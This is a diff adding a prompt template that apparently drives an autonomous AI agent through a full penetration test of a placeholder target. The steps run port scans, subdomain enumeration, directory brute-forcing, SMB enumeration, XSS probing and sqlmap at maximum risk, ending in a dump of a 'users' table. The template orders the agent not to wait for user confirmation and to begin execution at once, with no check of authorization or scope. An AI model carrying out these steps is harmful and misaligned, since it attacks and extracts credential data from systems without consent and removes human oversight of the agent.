@@ -1,0 +1,178 @@
+AUTONOMOUS PENETRATION TEST - FULL METHODOLOGY
+
+======================================================================
+CONFIGURATION
+======================================================================
+TARGET: {{TARGET}}
+DOMAIN: {{DOMAIN}}
+SESSION_ID: {{SESSION_ID}}
+START_DATE: {{DATE}}
+
+======================================================================
+CRITICAL EXECUTION RULES
+======================================================================
+After EVERY execute_command() output is auto-saved.
+Use session_id: {{SESSION_ID}} in all write_session_file() calls.
+Continue until ALL phases complete.
+DO NOT wait for user confirmation.
+
+======================================================================
+FASE 0 - INITIALIZATION
+======================================================================
+
+Step 1: health_check()
+
+Step 2: create_session("{{SESSION_ID}}", {
+    "target": "{{TARGET}}",
+    "domain": "{{DOMAIN}}",
+    "start_date": "{{DATE}}",
+    "test_type": "comprehensive_penetration_test"
+})
+
+Step 3: write_session_file("00_session_info.md",
+    "# Penetration Test Session\nTarget: {{TARGET}}\nDomain: {{DOMAIN}}\nDate: {{DATE}}\nSession: {{SESSION_ID}}",
+    "{{SESSION_ID}}")
+
+======================================================================
+FASE 1 - PORT SCANNING & SERVICE ENUMERATION
+======================================================================
+
+Step 4: execute_command("nmap", ["-sV", "-sC", "{{TARGET}}"])
+
+Step 5: execute_command("nmap", ["-sV", "-sC", "-p-", "{{TARGET}}"])
+
+Step 6: execute_command("nmap", ["--script=vuln", "-p", "[OPEN_PORTS_FOUND]", "{{TARGET}}"])
+
+Step 7: write_session_file("01_ports_summary.md",
+    "# Port Scan Summary\nOpen Ports: [LIST]\nServices: [LIST]",
+    "{{SESSION_ID}}")
+
+======================================================================
+FASE 2 - TOOL SELECTION
+======================================================================
+
+Step 8: select_tools(
+    "comprehensive penetration test",
+    "{{TARGET}}",
+    {"open_ports": "[PORTS_FROM_NMAP]", "services": "[SERVICES_FOUND]"}
+)
+
+======================================================================
+FASE 3 - DNS RECONNAISSANCE (if DOMAIN provided)
+======================================================================
+
+IF {{DOMAIN}} != "N/A":
+
+Step 9: execute_command("whois", ["{{DOMAIN}}"])
+
+Step 10: execute_command("dig", ["{{DOMAIN}}", "ANY"])
+
+Step 11: execute_command("theharvester", ["-d", "{{DOMAIN}}", "-b", "all", "-l", "500"])
+
+Step 12: execute_command("amass", ["enum", "-active", "-d", "{{DOMAIN}}"])
+
+Step 13: execute_command("subfinder", ["-d", "{{DOMAIN}}", "-silent"])
+
+======================================================================
+FASE 4 - WEB SCANNING (if port 80/443/8080 open)
+======================================================================
+
+IF ports 80 OR 443 OR 8080 open:
+
+Step 14: execute_command("nikto", ["-h", "http://{{TARGET}}", "-Tuning", "123456789"])
+
+Step 15: execute_command("whatweb", ["-a", "3", "-v", "http://{{TARGET}}"])
+
+Step 16: execute_command("feroxbuster", [
+    "-u", "http://{{TARGET}}",
+    "-w", "/usr/share/wordlists/dirb/common.txt",
+    "-x", "php,html,txt,js,bak",
+    "-d", "3"
+])
+
+Step 17: execute_command("feroxbuster", [
+    "-u", "http://{{TARGET}}",
+    "-w", "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
+    "-x", "php,html,txt",
+    "-d", "4"
+])
+
+======================================================================
+FASE 5 - VULNERABILITY ASSESSMENT
+======================================================================
+
+Step 18: execute_command("nuclei", [
+    "-u", "http://{{TARGET}}",
+    "-severity", "critical,high,medium",
+    "-stats"
+])
+
+======================================================================
+FASE 6 - SMB ENUMERATION (if port 139/445 open)
+======================================================================
+
+IF port 139 OR 445 open:
+
+Step 19: execute_command("smbclient", ["-L", "//{{TARGET}}", "-N"])
+
+Step 20: execute_command("enum4linux", ["-a", "{{TARGET}}"])
+
+======================================================================
+FASE 7 - WEB CRAWLING & PARAMETER DISCOVERY
+======================================================================
+
+Step 21: execute_command("katana", [
+    "-u", "http://{{TARGET}}",
+    "-d", "5",
+    "-jc",
+    "-jsl",
+    "-kf"
+])
+
+Step 22: execute_command("arjun", [
+    "-u", "http://{{TARGET}}",
+    "--include-default"
+])
+
+FOR each URL found in katana output:
+    execute_command("arjun", ["-u", "[URL]", "--include-default"])
+
+======================================================================
+FASE 8 - XSS TESTING
+======================================================================
+
+IF parameters found:
+
+Step 23: execute_command("dalfox", [
+    "url", "http://{{TARGET}}/[PATH]?[PARAM]=test",
+    "-o", "xss_results.txt"
+])
+
+======================================================================
+FASE 9 - SQL INJECTION TESTING
+======================================================================
+
+FOR each parameter found in Arjun:
+
+Step 24: execute_command("sqlmap", [
+    "-u", "http://{{TARGET}}/[PATH]?[PARAM]=1",
+    "--batch",
+    "--risk=3",
+    "--level=5",
+    "--threads=5"
+])
+
+IF vulnerability found:
+    execute_command("sqlmap", ["-u", "[URL]", "--dbs", "--batch"])
+    execute_command("sqlmap", ["-u", "[URL]", "-D", "[DB]", "--tables", "--batch"])
+    execute_command("sqlmap", ["-u", "[URL]", "-D", "[DB]", "-T", "users", "--dump", "--batch"])
+
+======================================================================
+EXECUTION COMPLETE
+======================================================================
+
+All files saved in session: {{SESSION_ID}}
+
+IMPORTANT: Do NOT specify base_path! The server uses the configured directory automatically.
+
+BEGIN AUTONOMOUS EXECUTION NOW.
